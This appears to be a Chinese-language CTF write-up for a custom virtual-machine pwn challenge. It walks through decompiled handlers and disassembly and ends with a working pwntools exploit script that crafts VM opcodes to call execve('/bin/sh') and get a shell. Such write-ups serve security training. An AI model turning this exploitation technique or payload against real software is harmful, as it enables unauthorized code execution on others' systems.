__int32 rsi;  __int32 rdx;  __int32 reg0;  __int32 reg1;  __int32 reg2;  __int32 esp;//esp，用于push，pop  __int8 flag;//部分比较的返回值，用处不大&#125;;\n\nstruct sa&#123;  uint8_t case_choice;//这两个用于表示选择哪个case，以及什么样的初始化  __int8 choice;  __int16 padding;//对齐用  uint32_t offset;//syscall时的rax，其余时候用于选择第几个寄存器，比如offset=0就是rdi，1就是rsi  __int32 num1;//这里是以为可能会有num2，但是实际上没有，但也懒得改回去了&#125;;\n\n攻击过程在输入0x18个字符之后的四个字节会用来控制ip，控制他指向我们后续的opcode\n后续只用到了case3和case0\n其中case3的case3是给寄存器赋值一个32位的任意值\n而case0是关键\ncase 0x33:case 0x34:                                  // herecase 0x35:case 0x36:case 0x37:case 0x38:case 0x39:case 0x3A:  sys(sa-&gt;offset);  n2_1 = (__int64)&amp;s-&gt;rdi;  s-&gt;rdi = (_DWORD)s + 12;  break;\n\n由于我们的结构体中没有rax，同时注意到sys的一参是offset\n观察汇编可以发现，程序在进入sys前，用rdi存储rax，rsi存储rdi等等，再进入sys后，又复制回来执行syscall\n虽然这么多case都对应了syscall，但是每个都是不同的\n因为我们的结构体中，各个寄存器都是32位的，无论我们后续要打execve还是orw，必然要有一个寄存器的值是一个地址指针，而在这个开启了pie的题目中，32位的值不足以作为一个地址\n但是题目之前既然可以自如的使用read，write，就说明这些syscall中有些特殊，观察case 0x34对应的汇编可以发现\n.text:000000000000171E                 mov     rax, [rbp+var_8] ; jumptable 000000000000152B case 52.text:0000000000001722                 mov     eax, [rax+20h].text:0000000000001725                 mov     eax, eax.text:0000000000001727                 mov     r8, rax.text:000000000000172A                 mov     rax, [rbp+var_8].text:000000000000172E                 mov     eax, [rax+1Ch].text:0000000000001731                 mov     eax, eax.text:0000000000001733                 mov     r9, rax.text:0000000000001736                 mov     rax, [rbp+var_8].text:000000000000173A                 mov     eax, [rax+18h].text:000000000000173D                 mov     eax, eax.text:000000000000173F                 mov     r10, rax.text:0000000000001742                 mov     rax, [rbp+var_8].text:0000000000001746                 mov     eax, [rax+14h].text:0000000000001749                 mov     eax, eax.text:000000000000174B                 mov     rcx, rax.text:000000000000174E                 mov     rax, [rbp+var_8].text:0000000000001752                 mov     eax, [rax+10h].text:0000000000001755                 mov     eax, eax.text:0000000000001757                 mov     rsi, rax.text:000000000000175A                 mov     rax, [rbp+var_8].text:000000000000175E                 mov     rdx, [rax].text:0000000000001761                 mov     rax, [rbp+var_8].text:0000000000001765                 mov     eax, [rax+0Ch].text:0000000000001768                 mov     eax, eax.text:000000000000176A                 add     rax, rdx    //此处的rdx实际上是buf，rax表示的是rdi寄存器的值.text:000000000000176D                 mov     rdx, [rbp+var_10].text:0000000000001771                 mov     edx, [rdx+4].text:0000000000001774                 mov     edx, edx.text:0000000000001776                 mov     rdi, rdx.text:0000000000001779                 push    r8.text:000000000000177B                 mov     r8, r10.text:000000000000177E                 mov     rdx, rsi.text:0000000000001781                 mov     rsi, rax//最终这个值会给到rsi.text:0000000000001784                 call    sys\n\n也就是说，在进入sys前，这一段操作，令rsi变成了一个64位数，并且值是buf+offset\n而rsi在进入sys后会把值给rdi，这也就说明，只要rdi的值是&#x2F;bin&#x2F;sh在buf上的偏移，在进入sys后，rdi的值就会是buf+偏移（即&#x2F;bin&#x2F;sh的指针）\n除此之外，在进入case0前，init中还有一步会循环处理我们的offset，为了使他最终是我们需要的0x3b，选择依顺序传入0，0，0x3b，最终offset就能是0x3b了\nfor ( i = 0; i &lt;= 2; ++i )&#123;  sa-&gt;offset &lt;&lt;= 8;  buf_start_5 = buf-&gt;buf_start;  v6 = buf-&gt;ip;  buf-&gt;ip = v6 + 1;  sa-&gt;offset |= *(unsigned __int8 *)(buf_start_5 + v6);&#125;\n\nexpfrom pwn import*context(arch = &#x27;amd64&#x27;)io=process(&#x27;./pwn&#x27;)#io=remote(&quot;node5.buuoj.cn&quot;,29468)def dbg():    gdb.attach(io)    pause()payload=b&#x27;/bin/sh\\x00&#x27;payload=payload.ljust(0x18,b&#x27;\\x00&#x27;)payload+=p32(0x2ffe0)#控制ippayload+=p8((0x3&lt;&lt;2)|3)+p8(0)+p32(0x2ffe0-28)#令rdi=offsetpayload+=p8((0x3&lt;&lt;2)|3)+p8(1)+p32(0)#令rsi=0payload+=p8((0x3&lt;&lt;2)|3)+p8(2)+p32(0)#令rdx=0payload+=p8((0x34)&lt;&lt;2|0)+p8(0)+p8(0)+p8(0x3b)#令rax=0x3b的同时，进入case0的case34触发syscall#dbg()io.send(payload)io.interactive()\n\n","tags":["wp"]}]